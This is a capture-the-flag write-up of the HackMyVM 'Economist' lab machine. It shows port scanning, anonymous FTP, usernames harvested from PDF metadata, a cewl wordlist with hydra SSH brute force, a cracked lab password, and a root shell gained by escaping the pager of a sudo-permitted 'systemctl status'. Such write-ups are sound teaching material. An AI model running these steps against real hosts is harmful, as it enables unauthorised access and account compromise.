---
categories: [HackMyVM]
tags: [FTP, cewl, Password Bruteforce, PrivEsc]  
img_path: /Vulnhub-Files/img/
image:
  path: Economist/Untitled.png
  alt: HackMyVM Machine 💵
---

## Description ⤵️

This machine is <kbd>*Economist*</kbd> , It is from HackMyVM Platform and categorized as Medium machine . Recon is the Essential thing to exploit this machine.

## Port Scan Results ⤵️

![Untitled](Economist/Untitled%201.png)

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.73
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 10:16 IST
Nmap scan report for 10.0.2.73
Host is up (0.00074s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home - Elite Economists
MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Web Enumeration ⤵️

Lets see port 80 first →

![Untitled](Economist/Untitled%202.png)

## FTP Enumeration ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ ftp 10.0.2.73 21      
Connected to 10.0.2.73.
220 (vsFTPd 3.0.3)
Name (10.0.2.73:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||13198|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Sep 13 14:30 .
drwxr-xr-x    2 0        119          4096 Sep 13 14:30 ..
-rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
226 Directory send OK.
ftp>
```
{: .nolineno}

Now I downloaded all the pdfs through `get <PDF_NAME>` →

I checked one of the pdfs through exiftool and I got an author name so lets extract that from all pdfs →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ exiftool Brochure-1.pdf                                 
ExifTool Version Number         : 12.67
File Name                       : Brochure-1.pdf
Directory                       : .
File Size                       : 174 kB
File Modification Date/Time     : 2023:09:13 17:10:45+05:30
File Access Date/Time           : 2023:10:14 08:25:57+05:30
File Inode Change Date/Time     : 2023:10:12 10:17:39+05:30
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 2
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : We are here for your wealth
Title                           : Elite Economists brochure 1
Author                          : joseph
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:03:17+02:00
```
{: .nolineno}

Now I used some scripting techniques like this →

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ exiftool *.pdf | grep Author | awk '{ print $3 }' | uniq  
joseph
richard
crystal
catherine
```
{: .nolineno}

Now I put these names in `user.txt` file .

Afterthat I created the wordlist file from its website with cewl tool ⇒ 

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ cewl -m 5 http://10.0.2.73/ > wordlists.tx
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ cat wordlists.txt| wc -l                        
333
```
{: .nolineno}

Now its time for SSH →

## SSH Enumeration ⤵️

I will be using this wordlists for ssh bruteforce using hydra tool →

![Untitled](Economist/Untitled%203.png)

```bash
joseph : wealthiest
```
{: .nolineno}

## SSH SHELL ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HackMyVM/Economist]
└─$ ssh joseph@10.0.2.73
The authenticity of host '10.0.2.73 (10.0.2.73)' cant be established.
ED25519 key fingerprint is SHA256:nKBoUMUnxyKH34KaiDU6gjV4RVOrd181pL9rHCLLD0s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.73' (ED25519) to the list of known hosts.
joseph@10.0.2.73s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 14 Oct 2023 03:40:14 AM UTC

  System load:  0.0                Processes:               128
  Usage of /:   48.8% of 11.21GB   Users logged in:         0
  Memory usage: 15%                IPv4 address for enp0s3: 10.0.2.73
  Swap usage:   0%

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

51 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

joseph@elite-economists:~$ whoami
joseph
joseph@elite-economists:~$ id
uid=1001(joseph) gid=1001(joseph) groups=1001(joseph)
joseph@elite-economists:~$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status

joseph@elite-economists:~$ sudo /usr/bin/systemctl status
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Sat 2023-10-14 02:53:14 UTC; 59min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─user@1001.service …
           │   │ └─init.scope 
           │   │   ├─3107 /lib/systemd/systemd --user
           │   │   └─3108 (sd-pam)
           │   └─session-5.scope 
           │     ├─3091 sshd: joseph [priv]
           │     ├─3191 sshd: joseph@pts/0
           │     ├─3192 -bash
           │     ├─3345 sudo /usr/bin/systemctl status
           │     ├─3346 /usr/bin/systemctl status
           │     └─3347 pager
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─irqbalance.service 
             │ └─684 /usr/sbin/irqbalance --foreground
             ├─apache2.service 
             │ ├─757 /usr/sbin/apache2 -k start
             │ ├─759 /usr/sbin/apache2 -k start
             │ └─760 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─655 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─410 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─673 /usr/sbin/cron -f
!bash
root@elite-economists:/home/joseph# whoami
root
root@elite-economists:/home/joseph# id
uid=0(root) gid=0(root) groups=0(root)
root@elite-economists:/home/joseph# cd /root
root@elite-economists:~# ls -al
total 36
drwx------  5 root root 4096 Oct 14 03:52 .
drwxr-xr-x 19 root root 4096 Sep 12 20:49 ..
-rw-------  1 root root    0 Sep 14 06:55 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-------  1 root root   69 Oct 14 03:52 .lesshst
drwxr-xr-x  3 root root 4096 Sep 12 21:28 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root 3271 Sep 14 06:54 root.txt
drwx------  3 root root 4096 Sep 12 20:52 snap
drwx------  2 root root 4096 Sep 12 20:52 .ssh
root@elite-economists:~# cat root.txt

                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                      
                                                                                                    
                                                                                                    
Flag: HMV{FLAGFLAGFLAGFLAGFLAG}
root@elite-economists:~# cat /home/joseph/user.txt 

                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                      
                                                                                                    
                                                                                                    
Flag: HMV{FLAGFLAGFLAGFLAGFLAG}
root@elite-economists:~#
```
{: .nolineno}

I am root now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }